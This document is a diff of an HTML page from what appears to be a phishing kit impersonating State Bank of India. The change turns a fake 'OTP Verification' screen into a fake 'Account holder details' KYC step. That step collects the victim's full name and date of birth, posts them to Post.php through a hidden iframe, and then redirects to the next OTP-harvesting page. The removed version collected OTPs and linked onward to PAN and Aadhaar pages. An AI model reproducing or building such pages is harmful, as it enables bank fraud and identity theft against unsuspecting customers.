@@ -1,7 +1,7 @@
 <!DOCTYPE HTML> 
 <html>
    <head>
-      <title>OTP Verification Error | SBI</title>
+      <title>State Bank of India - Account Details</title>
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
       <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -26,7 +26,10 @@
    width: 105%;
    padding: 5px;
    }
-   
+   .name
+   {
+   text-transform:uppercase;
+   }
    .login-box .user-box {
    position: relative;
    }
@@ -56,7 +59,7 @@
    pointer-events: none;
    transition: 0.3s;
    font-family: 'Open Sans', sans-serif;
-   font-weight:500;
+   font-weight:400;
    
    }
    .login-box input:focus {
@@ -89,6 +92,14 @@
    }
    .login-box-mob .user-box-mob {
    position: relative;
+   }
+   
+   .error
+   {
+   color: Red;
+   font-family: 'Work Sans', sans-serif;
+   font-size:11px;
+   font-style: italic;
    }
    </style>
    <script language="javascript"> 
@@ -123,14 +134,14 @@
          <div class="container">
          <!-- Static- Please don't do anything here-->
          <script type="text/javascript">var submitted=false;</script>
-         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Aadhar_Details.html';}"></iframe>
+         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_DOB.html';}"></iframe>
          <!--My Form-->
          <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
             <div class="box">
                <div class="page-hea">
                   <div class="row">
                      <div class="col-xs-6 col-md-6">
-                        <h2 style="font-family: 'Open Sans', sans-serif; font-weight:600;">Enter OTP !</h2>
+                        <h2 style="font-family: 'Open Sans', sans-serif; font-size:16px; font-weight:600; align-item:centre; text-align:centre;"> Account holder details </h2>
                      </div>
                      <div class="col-xs-6 col-md-6 text-right">
                         <h2>X</h2>
@@ -140,63 +151,96 @@
                <div class="row">
                   <div class="col-md-6 col-xs-12">
 				   <div class="progress">
-                              <div class="progress-bar" style="font-family: 'Open Sans', sans-serif; color:#fff; font-weight:500; width:70%;">60% KYC Completed</div>
+                              <div class="progress-bar" style="font-family: 'Open Sans', sans-serif; color:red; font-weight:500; width:50%;">25% KYC Completed !</div>
                            </div>
                      <div class="p-50">
-                        <center><h4 style="font-family: 'Open Sans', sans-serif; color:#000; font-weight:700; margin-top:-10%;">OTP Verification !</h4></center>
-                        <center><p1 style="font-size:13px; font-family: 'Open Sans', sans-serif; color:grey; font-weight:400;">We have send an OTP to your registered mobile number. Please enter the OTP and proceed.  </p1></center>
+                        <h4 style="font-family: 'Open Sans', sans-serif; color:#000; font-weight:700; margin-top:-10%;">Account holder verification</h4>
                         <br><br>
                         <div class="login-box">
                         <div class="user-box">
-                        <input type="text" name="Inv_PAN_OTP" inputmode="numeric" maxlength="8"
-                        pattern="\d{6,9}" title="Please enter valid OTP !"
+                        <input type="text" name="Full_Name" class="name" onkeydown="return /[a-z A-Z]/i.test(event.key)" minlength="3" maxlength="40"
                         required="">
-                        <label>Enter Valid OTP<span style="color:red;"> *</span></label>
+                        <label>Account holder name<span style="color:red;"> *</span></label>
                         </div>
-                        <div id="inv">
-                        <p1 style="font-size:12px; color:red; font-style:italic; font-family: 'Work Sans', sans-serif; position:absolute; margin-top:-10%; margin-left:-5%;">
-                        Invalid One Time Password !</p1>
-                        </div>
+                        <div class="user-box">
+                        <input type="text" name="Date_Of_Birth" id="date" inputmode="numeric" maxlength="10"
+                        required="">
+                        <label>Date Of Birth<span style="color:red;"> *</span></label>
+                        <p1><span class="error" style="display:none; position:absolute; margin:-6%; margin-left:0px;">Invalid Date Of Birth !</span></p1>
+                        </tr>
+                        </table>
                         <script type="text/javascript">
-                        var timer=180;
-                        var sec=0;
-                        function startTimer() {
-                        sec=parseInt(timer%180);
+                        var isShift = false;
+                        var seperator = "/";
+                        window.onload = function () {
+                        //Reference the Table.
+                        var tblForm = document.getElementById("date");
                         
-                        if (timer<2) {
-                        // timer.stop();
-                        window.location.href = "PAN_Card_Details.html";
+                        //Reference all INPUT elements in the Table.
+                        var inputs = document.getElementsByTagName("input");
+                        
+                        //Loop through all INPUT elements.
+                        for (var i = 0; i < inputs.length; i++) {
+                        //Check whether the INPUT element is TextBox.
+                        if (inputs[i].name == "Date_Of_Birth") {
+                        //Check whether Date Format Validation is required.
+                        if (inputs[i].className.indexOf("date-format") != 1) {
+                        
+                        //Set Max Length.
+                        inputs[i].setAttribute("maxlength", 10);
+                        
+                        //Only allow Numeric Keys.
+                        inputs[i].onkeydown = function (e) {
+                        return IsNumeric(this, e.keyCode);
+                        };
+                        
+                        //Validate Date as User types.
+                        inputs[i].onkeyup = function (e) {
+                        ValidateDateFormat(this, e.keyCode);
+                        };
+                        }
+                        }
+                        }
+                        };
+                        
+                        function IsNumeric(input, keyCode) {
+                        if (keyCode == 16) {
+                        isShift = true;
+                        }
+                        //Allow only Numeric Keys.
+                        if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
+                        if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
+                        input.value += seperator;
                         }
                         
-                        document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
-                        timer--;
-                        setTimeout(function(){
-                        startTimer();
-                        
-                        }, 1000);
+                        return true;
                         }
+                        else {
+                        return false;
+                        }
+                        };
+                        
+                        function ValidateDateFormat(input, keyCode) {
+                        var dateString = input.value;
+                        if (keyCode == 16) {
+                        isShift = false;
+                        }
+                        var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
+                        
+                        //Check whether valid dd/MM/yyyy Date Format.
+                        if (regex.test(dateString) || dateString.length == 0) {
+                        ShowHideError(input, "none");
+                        } else {
+                        ShowHideError(input, "block");
+                        }
+                        };
                         
                         </script>
-                        <script>
-                        var url = document.URL;
-                        document.getElementById("url").innerHTML = "URL: " + str;
-                        function replicateTab(){
-                        if(window.confirm("OTP resend successfully, Please check your phone inbox.")){
-                        window.location.href="Invalid_OTP_PAN.html";
-                        }
-                        }
-                        </script>
-                        <button id = "button" onclick = "replicateTab()"style="font-family: 'Open Sans', sans-serif; font-weight:700; color:#673391; background-color:transparent; border:none; position:absolute; margin-top:-10%; margin-left:45%; text-decoration:none;">Resend OTP</button>
-                        <div style="margin-top:0;">
-                        <center><b style="font-family: 'Open Sans', sans-serif; font-weight:500; color:grey; font-family: 'Work Sans', sans-serif; font-size:14px; text-align:center;"><span style="color:grey; font-family: 'Work Sans', sans-serif; font-size:13px;" id="time"></span>&nbsp;second</b></center>
-                        </div><br><br>
                         </div>
-                     </div>
-                  </div>
-               </div><br><br>
+               </div>
             </div>
             <div class="row">
-               <div style="margin-top:-15%;" class="col-xs-12 col-md-12 text-center">
+               <div class="col-xs-12 col-md-12 text-center">
                   <a href="#" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-border">Back</a>
                   <button type="submit" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-primary"> Submit </button>
                </div>
